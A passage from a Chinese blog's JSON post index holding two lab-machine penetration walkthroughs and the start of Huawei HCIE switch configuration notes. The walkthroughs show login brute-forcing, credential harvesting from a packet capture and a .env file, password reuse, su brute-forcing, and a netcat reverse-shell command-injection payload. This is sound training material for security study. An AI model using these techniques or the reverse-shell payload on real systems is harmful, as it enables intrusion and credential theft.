\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.132            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:24 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00018s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n38415/tcp open  unknown\nMAC Address: 08:00:27:E2:DB:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.10 seconds\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p38415 -sC -sV 192.168.205.132\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:26 EDT\nNmap scan report for 192.168.205.132\nHost is up (0.00032s latency).\n\nPORT      STATE SERVICE VERSION\n38415/tcp open  http    Golang net/http server\n|_http-title: \\xE6\\x9A\\x82\\xE6\\x97\\xB6\\xE6\\x97\\xA0\\xE6\\xB3\\x95\\xE8\\xAE\\xBF\\xE9\\x97\\xAE\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest, HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/html; charset=utf-8\n|     Set-Cookie: panel_public_key=LS0tLS1C...\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5f00\u653e\u4e86 **22 (SSH)**, **80 (HTTP)**, \u548c **38415** \u4e09\u4e2a\u7aef\u53e3\u3002\u5bf938415\u7aef\u53e3\u7684\u8fdb\u4e00\u6b65\u626b\u63cf\u663e\u793a\u5b83\u662f\u4e00\u4e2aGolang\u7684HTTP\u670d\u52a1\u3002\n\n## 3. Web\u76ee\u5f55\u626b\u63cf\n\n\u4f7f\u7528 `gobuster` \u5bf980\u7aef\u53e3\u7684Web\u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u51e0\u4e2a\u6807\u51c6PHP\u9875\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n...\n/index.php            (Status: 200)\n/logout.php           (Status: 302)\n/dashboard.php        (Status: 302)\n...\n```\n\n# \u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9\n\n# 1. \u540e\u53f0\u767b\u5f55\u7206\u7834\n\n\u8bbf\u95ee `http://192.168.205.132` \u662f\u4e00\u4e2a\u767b\u5f55\u9762\u677f\u300238415\u662f1Panel \uff0c\u4f46\u662f\u663e\u793a\u201c\u65e0\u6cd5\u8bbf\u95ee\uff0c\u5f53\u524d\u73af\u5883\u5df2\u7ecf\u5f00\u542f\u4e86\u5b89\u5168\u5165\u53e3\u767b\u5f55\u201d\uff0c\u6211\u8fd8\u4ee5\u4e3a\u662f\u6253CVE-2025-54424\uff0c\u4f46\u662f\u770b\u4e86\u4e00\u4e0b\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u9700\u8981https\u8bf7\u6c42\uff0c\u786e\u5207\u7684\u8bf4\u662ftls\u901a\u4fe1\uff0c\u4f46\u662f\u6211\u4eec\u7684\u8bf7\u6c42\u662fhttp\u7684\uff0c\u6240\u4ee5\u6682\u65f6\u4e0d\u7ba1\u3002\n\n\u90a3\u5c31\u7b80\u5355\u7684\u7206\u7834\u4e00\u4e0b80 web\u7684\u5bc6\u7801\uff0c\u8f93\u5165\u4e86\u51e0\u4e2a\u5e38\u89c1\u7684\u7528\u6237admin,root,guest,test\uff0c\u7206\u7834\u6ca1\u6536\u83b7\uff0c\u4f46\u662f\u53d1\u73b0\u4e86\u4e00\u70b9\u95ee\u9898\uff0c\u5b83\u7206\u7834\u7684\u5f88\u5feb\uff0c\u90a3\u6211\u7528\u6237\u540d\u90a3\u91cc\u5c31\u76f4\u63a5\u4f7f\u7528burp\u7684\u7528\u6237\u540d\u5217\u8868\uff0c\u7136\u540e\u5bc6\u7801\u4f7f\u75285000q.txt\uff08rockyou\u524d5000\u884c\uff09\n\n![image-20250812213450561](http://7r1UMPHK.github.io/image/20250812221133339.webp)\n\n\u6210\u529f\u7206\u7834\u51fa\u4e00\u7ec4\u51ed\u8bc1\uff1a\n\n*   **\u7528\u6237\u540d**: `administrator`\n*   **\u5bc6\u7801**: `123456`\n\n## 2. \u4fe1\u606f\u6cc4\u9732\u4e0e\u6a2a\u5411\u79fb\u52a8\n\n\u4f7f\u7528\u4e0a\u8ff0\u51ed\u8bc1\u767b\u5f55\u540e\u53f0\uff0c\u5728\u4eea\u8868\u76d8\u9875\u9762\u53d1\u73b0\u5173\u952e\u4fe1\u606f\u3002\u9875\u9762\u63d0\u793a1Panel\u5176\u5b89\u5168\u8bbf\u95ee\u8def\u5f84\uff1a`/122b059247/`\n\n\u6b64\u5916\uff0c\u9875\u9762\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6570\u636e\u5305\u6587\u4ef6\u4f9b\u4e0b\u8f7d\u3002\u8fd9\u6211\u719f\u554a:)\n\n![image-20250812213735688](http://7r1UMPHK.github.io/image/20250812221138105.webp)\n\n\u8bbf\u95ee `http://192.168.205.132:38415/122b059247/`\uff0c\u786e\u8ba4\u662f\u4e00\u4e2a1Panel\u7684\u767b\u5f55\u754c\u9762\u3002\u5c1d\u8bd5\u4e86\u51e0\u4e2a\u5f31\u5bc6\u7801\uff0c\u65e0\u679c\uff0c\u4e0b\u8f7d\u6293\u5305\u67e5\u770b\u3002\n\n## 3. \u6570\u636e\u5305\u5206\u6790\n\n\u4e0b\u8f7d\u540e\u53f0\u63d0\u4f9b\u7684\u6570\u636e\u5305\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528Wireshark\u8fdb\u884c\u5206\u6790\u3002\u5148\u5c1d\u8bd5\u8fc7\u6ee4`tcp.port == 38415`\u6ca1\u7ed3\u679c\uff0c\u7136\u540e\u901a\u8fc7\u5b57\u7b26\u4e32\u641c\u7d22\u529f\u80fd\u67e5\u627e\u5173\u952e\u5b57\uff0c\u9009\u62e9 'Packet bytes' \u548c 'String' \u641c\u7d22'password'\uff0c\u6210\u529f\u53d1\u73b0\u4e86\u4e09\u7ec4\u767b\u5f55\u51ed\u8bc1\uff1a\n\n*   `root:root`\n*   `admin:admin`\n*   `root:superpassword123`\n\n\u4f7f\u7528\u6700\u540e\u4e00\u7ec4\u51ed\u8bc1 `root:superpassword123` \u6210\u529f\u767b\u5f551Panel\u540e\u53f0\u3002\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u5229\u75281Panel\u83b7\u53d6Root\u6743\u9650\n\n1Panel\u7c7b\u4f3c\u7684\u8fd0\u7ef4\u9762\u677f\uff0c\u901a\u5e38\u662froot\u7528\u6237\u5728\u8dd1\uff0c\u6211\u672c\u8eab\u8bf4\u4e00\u6b65\u5230\u4f4d\uff0c\u76f4\u63a5\u4f7f\u7528\u7ec8\u7aef\u529f\u80fd\u7684\uff0c\u4f46\u662f\u5b83\u5c45\u7136\u627e\u6211\u8981\u5bc6\u7801\uff0c\u6211\u54ea\u6765\u7684\u5bc6\u7801\u7ed9\u4f60\u2049\n\n\u90a3\u6211\u4eec\u5229\u7528SSH\u5bc6\u94a5\u7ba1\u7406\u529f\u80fd\u6765\u83b7\u53d6\u79c1\u94a5\u5427\u3002\n\n\u8fdb\u51651Panel\u540e\u53f0\uff0c\u5bfc\u822a\u81f3 **\u7cfb\u7edf > SSH\u7ba1\u7406 > \u5bc6\u94a5\u8ba4\u8bc1**\uff0c\u751f\u6210\u5bc6\u94a5\uff0c\u7136\u540ectrl+c\uff0cctrl+v\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ vim id_rsa \n                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ chmod 600 id_rsa                \n                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh root@192.168.205.132 -i id_rsa\nLinux Pane1 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n...\nLast login: Mon Aug 11 08:47:18 2025 from 192.168.3.94\nroot@Pane1:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n```bash\nroot@Pane1:~# cat /root/root.txt\nflag{root-e07910a06a086c83ba41827aa00b26ed}\n\nroot@Pane1:~# cat /home/kaada/user.txt\nflag{user-ef68ba312de0daa3dd200a3f9275a6f6}\n```\n\n\u6ca1\u5565\u597d\u8bf4\u7684\uff0clow\u4e2dlowsentence", "top": 0, "createdAt": 1755008531, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-12", "dateLabelColor": "#0969da"}, "P209": {"htmlDir": "docs/post/nei-bu-_Cloud.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Cloud", "postUrl": "post/nei-bu-_Cloud.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/209", "commentNum": 0, "wordCount": 3856, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728 `192.168.205.0/24` \u7f51\u6bb5\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.142 08:00:27:0f:75:63       PCS Systemtechnik GmbH\n...\n```\n\n\u786e\u8ba4\u76ee\u6807\u4e3b\u673aIP\u5730\u5740\u4e3a `192.168.205.142`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\u4e0e\u670d\u52a1\u63a2\u6d4b\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.142\n...\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n666/tcp   open  doom\n9443/tcp  open  tungsten-https\n9455/tcp  open  unknown\n65443/tcp open  unknown\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u591a\u4e2a\u5f00\u653e\u7aef\u53e3\u3002\u5176\u4e2d `9455` \u7aef\u53e3\u8fd0\u884c\u7740\u4e00\u4e2a\u672a\u77e5\u7684\u201cAdmin Service\u201d\uff0c\u8fd9\u901a\u5e38\u662f\u503c\u5f97\u4f18\u5148\u63a2\u7d22\u7684\u7a81\u7834\u53e3\u3002\u4f7f\u7528 `netcat` \u8fde\u63a5\u8be5\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc 192.168.205.142 9455\nWelcome to Admin Service\nType 'help' for available commands\nAvailable commands:\n  help          - Show this help\n  whoami        - Show current user\n  system-status - Show system status\n  exit          - Disconnect\n```\n\n\u5728\u4ea4\u4e92\u5f0fShell\u4e2d\u8f93\u5165 `help`\uff0c\u53d1\u73b0\u4e00\u4e2a\u9690\u85cf\u7684\u547d\u4ee4 `show-admin-pass`\u3002\n\n```bash\nhelp\nAvailable commands:\n  help          - Show this help\n  whoami        - Show current user\n  system-status - Show system status\n  show-admin-pass - Show admin password\n  exit          - Disconnect\nshow-admin-pass\nAdmin Password: 5jRrRnE9\n```\n\n\u6210\u529f\u83b7\u53d6\u5230\u4e00\u4e2a\u7ba1\u7406\u5458\u5bc6\u7801 `5jRrRnE9`\u3002\u6839\u636e\u7aef\u53e3\u626b\u63cf\u7ed3\u679c\uff0c`9443` \u7aef\u53e3\u8fd0\u884c\u7740\u4e00\u4e2a\u96f7\u6c60WAF\uff0c\u63a8\u6d4b\u8be5\u5bc6\u7801\u662fWAF\u7684\u767b\u5f55\u51ed\u8bc1\u3002\n\n# \u4e8c\u3001Web\u6e17\u900f\u4e0e\u7acb\u8db3\u70b9\n\n## 1. \u7ed5\u8fc7WAF\u9632\u62a4\n\n\u8bbf\u95ee `https://192.168.205.142:9443`\uff0c\u8fdb\u5165\u96f7\u6c60WAF\u7684\u767b\u5f55\u9875\u9762\u3002\u4f7f\u7528\u7528\u6237\u540d `admin` \u548c\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684\u5bc6\u7801 `5jRrRnE9` \u6210\u529f\u767b\u5f55\u3002\n\n\u5728WAF\u7684\u7ba1\u7406\u540e\u53f0\u4e2d\uff0c\u53d1\u73b0\u5176\u9632\u62a4\u4e86\u4e00\u4e2aWeb\u5e94\u7528\uff0c\u4f46\u8be5\u5e94\u7528\u5f53\u524d\u5904\u4e8e\u201c\u7ef4\u62a4\u6a21\u5f0f\u201d\u3002\u8fd9\u662f\u5bfc\u81f4\u76f4\u63a5\u8bbf\u95ee80\u7aef\u53e3\u9875\u9762\u5f02\u5e38\u7684\u539f\u56e0\u3002\n\n\u6211\u4eec\u5c06\u9632\u62a4\u6a21\u5f0f\u4ece\u201c\u7ef4\u62a4\u201d\u5207\u6362\u4e3a\u201c\u89c2\u5bdf\u201d\uff0c\u4f7fWeb\u5e94\u7528\u6062\u590d\u6b63\u5e38\u8bbf\u95ee\u3002\n\n![image-20250813213042337](http://7r1UMPHK.github.io/image/20250813213325461.webp)\n\n## 2. \u547d\u4ee4\u6ce8\u5165\u4e0eGetshell\n\n\u91cd\u65b0\u8bbf\u95ee `http://192.168.205.142`\uff0c\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u670d\u52a1\u5668\u72b6\u6001\u68c0\u67e5\u5de5\u5177\u3002\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u4e2a\u201c\u81ea\u5b9a\u4e49\u547d\u4ee4\u201d\u7684\u8f93\u5165\u70b9\uff0c\u6697\u793a\u53ef\u80fd\u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\n\n\u6211\u4eec\u5728\u6b64\u5904\u76f4\u63a5\u6784\u9020\u53cd\u5f39Shell\u7684Payload\uff0c\u5e76\u7528 `nc` \u5728Kali\u653b\u51fb\u673a\u4e0a\u8fdb\u884c\u76d1\u542c\u3002\n\n* **Payload**: `busybox nc 192.168.205.128 8888 -e /bin/bash`\n\n* **Kali\u76d1\u542c**:\n\n  ```bash\n  \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n  \u2514\u2500$ nc -lvnp 8888\n  listening on [any] 8888 ...\n  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 37450\n  id\n  uid=33(www-data) gid=33(www-data) groups=33(www-data)\n  ```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39Shell\uff0c\u83b7\u5f97 `www-data` \u7528\u6237\u6743\u9650\u3002\n\n* **\u7a33\u5b9aShell:**\n\n  ```bash\n  script /dev/null -c bash\n  Ctrl+Z\n  stty raw -echo; fg\n  reset xterm\n  export TERM=xterm\n  export SHELL=/bin/bash\n  stty rows 24 columns 80\n  ```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u6a2a\u5411\u79fb\u52a8 (www-data -> lucky)\n\n\u5728 `www-data` \u7684Shell\u4e2d\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u5728 `/data/safeline/` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u654f\u611f\u7684\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u6587\u4ef6 `.env`\u3002\n\n```bash\nwww-data@Cloud:/tmp$ cat /data/safeline/.env\nSAFELINE_DIR=/data/safeline\nPOSTGRES_PASSWORD=vivrdIDj6fhNJIRdnitL\nMGT_PORT=9443\nRELEASE=\nCHANNEL=\nREGION=\nIMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline\nIMAGE_TAG=9.2.1\nSUBNET_PREFIX=192.168.0\nARCH_SUFFIX=\n```\n\n\u8be5\u6587\u4ef6\u6cc4\u9732\u4e86\u4e00\u4e2aPostgreSQL\u6570\u636e\u5e93\u5bc6\u7801 `vivrdIDj6fhNJIRdnitL`\u3002\u8003\u8651\u5230\u5bc6\u7801\u590d\u7528\u7684\u53ef\u80fd\u6027\uff0c\u5c1d\u8bd5\u4f7f\u7528\u6b64\u5bc6\u7801\u5207\u6362\u5230\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u7528\u6237\u3002\n\n```bash\nwww-data@Cloud:/tmp$ su lucky\nPassword: vivrdIDj6fhNJIRdnitL\nlucky@Cloud:/home$ id\nuid=1000(lucky) gid=1000(lucky) groups=1000(lucky)\n```\n\n\u6210\u529f\u4f7f\u7528\u8be5\u5bc6\u7801\u5207\u6362\u5230 `lucky` \u7528\u6237\uff0c\u5b8c\u6210\u4e86\u6a2a\u5411\u79fb\u52a8\u3002\n\n## 2. \u63d0\u6743\u81f3root (lucky -> root)\n\n\u5728 `lucky` \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `.hint` \u7684\u63d0\u793a\u6587\u4ef6\u3002\n\n```bash\nlucky@Cloud:~$ cat .hint\nroot password length is 4.\nRegex is : 'r..o'\n```\n\n\u63d0\u793a\u4fe1\u606f\u7ed9\u51fa\u4e86 `root` \u5bc6\u7801\u7684\u683c\u5f0f\uff1a\u957f\u5ea6\u4e3a4\uff0c\u4e14\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f `'r..o'`\u3002\u6211\u4eec\u53ef\u4ee5\u636e\u6b64\u751f\u6210\u4e00\u4e2a\u5bc6\u7801\u5b57\u5178\uff0c\u7136\u540e\u8fdb\u884c\u7206\u7834\u3002\n\n1. **\u751f\u6210\u5b57\u5178**\uff1a\n\n   ```bash\n   lucky@Cloud:~$ for a in {a..z}; do for b in {a..z}; do echo 'r${a}${b}o'; done; done > /tmp/pass\n   ```\n\n2. **\u66b4\u529b\u7834\u89e3**\uff1a\n   \u4f7f\u7528 `su` \u7206\u7834\u811a\u672c\uff08\u5982 `suForce`\uff09\u548c\u751f\u6210\u7684\u5b57\u5178\u5bf9 `root` \u8d26\u6237\u8fdb\u884c\u5bc6\u7801\u731c\u89e3\u3002\n\n   ```bash\n   lucky@Cloud:/tmp$ ./suForce -u root -w pass\n   ...\n   \ud83d\udca5 Password | rooo\n   ...\n   ```\n\n   \u6210\u529f\u7834\u89e3\u51fa `root` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `rooo`\u3002\n\n3. **\u5207\u6362\u81f3root**\uff1a\n\n   ```bash\n   lucky@Cloud:/tmp$ su -\n   Password: rooo\n   root@Cloud:~# id\n   uid=0(root) gid=0(root) groups=0(root)\n   ```\n\n   \u6210\u529f\u83b7\u5f97root\u6743\u9650\u3002\n\n# \u56db\u3001\u83b7\u53d6Flag\n\n\u73b0\u5728\u62e5\u6709\u4e86root\u6743\u9650\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6240\u6709\u7684Flag\u3002\n\n```bash\nroot@Cloud:~# cat /root/root.txt\nflag{root-74cc1c60799e0a786ac7094b532f01b1}\n\nroot@Cloud:~# cat /home/lucky/user.txt\nflag{user-72cfd272ace172fa35026445fbef9b03}\n```\n\n\u6240\u6709Flag\u5747\u5df2\u627e\u5230\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1755092060, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-13", "dateLabelColor": "#0969da"}, "P210": {"htmlDir": "docs/post/HCIE-Q1.html", "labels": ["\u534e\u4e3a\u6570\u901a"], "postTitle": "HCIE-Q1", "postUrl": "post/HCIE-Q1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/210", "commentNum": 0, "wordCount": 29811, "description": "![image-20250811083621208](http://7r1UMPHK.github.io/image/20250813214159666.webp)\n\n# 1 \u90e8\u7f72\u7f51\u7edc\u53ef\u9760\u6027\n\n## 1.1 \u914d\u7f6e\u4ea4\u6362\u673a\u5806\u53e0\n\n*ps:\u5806\u53e0ensp\u505a\u4e0d\u4e86\uff0c\u6682\u65f6\u4e0d\u7ba1*\n\n### X_T2_AGG1-2\n\n\u91cd\u542f1-2\uff0c\u4fdd\u8bc11\u4e3a\u4e3b\n\n```\nreboot fast\n```\n\n### X_T2_AGG1-1\n\n```\nstack slot 0 priority 200\nint stack-port 0/1\nport int X0/0/1 en\nshut int X0/0/1\nq\nint stack-port 0/2\nport int X0/0/2 en\nshut int X0/0/2\nq\n```\n\n### X_T2_AGG1-2\n\n```\nint stack-port 0/1\nport int X0/0/2 en\nq\nint stack-port 0/2\nport int X0/0/1 en\nq\nq\n```\n\n### X_T2_AGG1-1\n\n```\n--\u6253\u5f00X_T2_AGG1-1\u5806\u53e0\u4e92\u8054\u63a5\u53e3(\u5efa\u8bae\u76f4\u63a5\u590d\u5236)--\nint stack-port 0/1\nundo shut int X0/0/1\nq\nint stack-port 0/2\nundo shut int X0/0/2\nq\n----------------------------\nsys X_T2_AGG1\ndis stack\n```\n\n![image-20250811083042852](http://7r1UMPHK.github.io/image/20250813214156783.webp)\n\n> [!TIP]\n> \u4e3b\u5907\u5012\u6362:\n>\n> slave switchover enable\n>\n> slave switchover\n>\n> \u91cd\u7f6e\u5806\u53e0:\n>\n> reset stack configuration\n\n*ps:\u5f53\u914d\u7f6e\u5806\u53e0\u6709\u8bef\uff0c\u5efa\u8bae\u76f4\u63a5\u91cd\u7f6e\u5806\u53e0*\n\n## 1.2 \u914d\u7f6e\u94fe\u8def\u805a\u5408\n\n![image-20250811083741031](http://7r1UMPHK.github.io/image/20250813214149499.webp)\n\n*ps:\u914d\u7f6e\u94fe\u8def\u805a\u5408\u65f6\u6ce8\u610f\u4f7f\u7528dis ll n b\u67e5\u770b\u4e92\u8054\u63a5\u53e3\uff0c\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u800c\u5b9a\uff0c\u5207\u52ff\u6b7b\u8bb0\u63a5\u53e3\u7f16\u53f7*\n\n\u5148\u5c06\u76f8\u5173\u8bbe\u5907\u6539\u540d\uff0c\u5f00\u542flldp\n\n### \u6279\u91cf\n\n```\nsys\nsys *\nll en\n```\n\n### Core\n\n```\n[X_T1_Core1]dis lldp neighbor  brief \nLocal Intf   Neighbor Dev             Neighbor Intf             Exptime\nGE0/0/11     X_T2_AGG1                GE0/0/13                  93     \nGE0/0/12     X_T2_AGG1                GE0/0/14                  93     \nGE0/0/13     X_T1_AGG1                GE0/0/13                  95     \nGE0/0/14     X_T1_AGG1                GE0/0/14                  95     \nGE0/0/21     X_T2_AGG1                GE0/0/23                  93     \nGE0/0/22     X_T2_AGG1                GE0/0/24                  93     \nGE0/0/23     X_T1_AGG1                GE0/0/23                  95     \nGE0/0/24     X_T1_AGG1                GE0/0/24                  92    \n```\n\n13\uff0c14\uff0c23\uff0c24\u662feth1\u7684\uff0c\u901a\u5e38\u6765\u8bf4\u662f\u9884\u914d\u7684\uff0c\u68c0\u67e5\n\n```\n[X_T1_Core1]dis eth\nLocal:\nLAG ID: 1                   WorkingMode: STATIC                               \nPreempt Delay: Disabled     Hash arithmetic: According to SIP-XOR-DIP         \nSystem Priority: 32768      System ID: 4c1f-cc7a-6702                         \nLeast Active-linknumber: 1  Max Active-linknumber: 8                          \nOperate status: up          Number Of Up Port In Trunk: 4                     \n--------------------------------------------------------------------------------\nActorPortName          Status   PortType PortPri PortNo PortKey PortState Weight\nGigabitEthernet0/0/13  Selected 1GE      32768   14     305     10111100  1     \nGigabitEthernet0/0/14  Selected 1GE      32768   15     305     10111100  1     \nGigabitEthernet0/0/23  Selected 1GE      32768   24     305     10111100  1     \nGigabitEthernet0/0/24  Selected 1GE      32768   25     305     10111100  1   \n```\n\n\u90a3\u76f4\u63a5\u914d\u7f6eeth2\n\n```\nint eth 2\nmode lacp\ntr g 0/0/11 0/0/12 0/0/21 0/0/22\nq\n```\n\n### T2\n\n\u4e5f\u662f\u6279\u91cf\u6253\u5f00X_T2_AGG1\u3001X_T2_ACC1\u3001X_T2_ACC2\u7684lldp\u534f\u8bae\n\n```\nsys\nsys *\nll en\n```\n\n\u7136\u540e\u4f9d\u65e7\u662f\u4f7f\u7528lldp\u663e\u793a\u51fa\u4e86\u8fde\u63a5\u4fe1\u606f\u914d\u7f6e\u94fe\u8def\u805a\u5408\n\n#### X_T2_AGG1\n\n```\nint eth 1\nmode lacp\ntr g 0/0/13 0/0/14 0/0/23 0/0/24\nq\nint eth 2\nmode lacp\ntr g 0/0/11 0/0/21\nint eth 3\nmode lacp\ntr g 0/0/12 0/0/22\nq\n```\n\n#### X_T2_ACC1\n\n```\nint eth 1\nmode lacp\ntr g 0/0/23 0/0/24\nq\n```\n\n#### X_T2_ACC2\n\n```\nint eth 1\nmode lacp\ntr g 0/0/23 0/0/24\nq\n```\n\n![image-20250811085948464](http://7r1UMPHK.github.io/image/20250813214145946.webp)\n\n# 2-3 \u57fa\u672c\u4e1a\u52a1\u9700\u6c42\u4e0eVPN\u5b9e\u4f8b\u914d\u7f6e\n\n![image-20250811090108661](http://7r1UMPHK.github.io/image/20250813214144023.webp)\n\n![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)\n\n## \u521b\u5efaVPN\u5b9e\u4f8b\n\n### Core\n\n```\nip v Employee\nrou 65001:1\nq\nq\nip v Guest\nrou 65001:2\nq\nq\n```\n\n## \u914d\u7f6eVPN\u4e0eIP\n\n### X_T1_Export2\n\n```\nvlan 202\nint g6/0/1\np l a\np d v 202\nint vlan202\nip add 10.1.200.5 30\nint g0/0/0\nip add 10.255.3.1 24\nint g0/0/1\nip add 10.255.4.1 24\nint l0\nip add 10.1.0.2 32\nq\n```\n\n### X_T1_Core1\n\n*ps:\u914d\u7f6evlan\u7684\u90a3\u91cc\uff0c\u5efa\u8bae\u76f4\u63a5\u5f00\u4e2atxt\u6587\u672c\u4fee\u6539\uff0c\u90a3\u6837\u5feb\u4e00\u70b9*\n\n```\nv b 60 201 to 209 51 to 55 100 to 105\n# \u6211\u9884\u914d\u6709\u95ee\u9898\uff0c\u4ed6X_T1_Core1\u662fa\u53e3\uff0cX_T1_Export1\u662ft\u53e3\uff0c\u6211\u7edf\u4e00\u4e00\u4e0b\uff0c\u4e0d\u7136\u7b49\u4f1aOSPF\u90bb\u5c45\u4f1a\u5361Init\nint g0/0/1\nundo port default vlan\nundo port link-type\np l t\np t a v 201\nint g0/0/2\np l a\np d v 202\nint g0/0/3\np t a v 51 to 55 100 to 105 203\nint g0/0/4\np l t \np t a v 204 205\nun p t a v 1\nint g0/0/5\np l t\np t a v 206 207\nun p t a v 1\nint g0/0/6\np l a\np d v 60\nint vlan60\nip bin vpn-ins Employee\nip add 10.1.60.254 24\nint eth2\np l t\np t a v 100 209\nq\ndhcp en\n\nint vlan202\nip add 10.1.200.6 30\nint vlan204\nip add 10.1.200.13 30\nint vlan205\nip add 10.1.200.17 30\nint vlan206\nip bin vpn-ins Employee\nip add 10.1.200.21 30\nint vlan207\nip bin vpn-ins Guest\nip add 10.1.200.25 30\nint vlan208\nip bin vpn-ins Employee\nip add 10.1.200.29 30\ndhcp select global\nint vlan209\nip bin vpn-ins Employee\nip add 10.1.200.33 30\ndhcp select global\n\nint l1\nip bin vpn-ins Employee\nip add 10.1.0.4 32\nint l2\nip bin vpn-ins Guest\nip add 10.1.0.5 32\n\nint vlan51\nip bin vpn-ins Employee\nip add 10.1.51.254 24\ndhcp select global\nint vlan 52\nip bin vpn-ins Employee\nip add 10.1.52.254 24\ndhcp select global\nint vlan53\nip bin vpn-ins Employee\nip add 10.1.53.254 24\ndhcp select global\nint vlan 54\nip bin vpn-ins Employee\nip add 10.1.54.254 24\ndhcp select global\nint vlan 55\nip bin vpn-ins Employee\nip add 10.1.55.254 24\ndhcp select global\n\nint vlan 101\nip bin vpn-ins Guest\nip add 10.1.101.254 24\ndhcp select global\nint vlan 102\nip bin vpn-ins Guest\nip add 10.1.102.254 24\ndhcp select global\nint vlan 103\nip bin vpn-ins Guest\nip add 10.1.103.254 24\ndhcp select global\nint vlan 104\nip bin vpn-ins Guest\nip add 10.1.104.254 24\ndhcp select global\nint vlan 105\nip bin vpn-ins Guest\nip add 10.1.105.254 24\ndhcp select 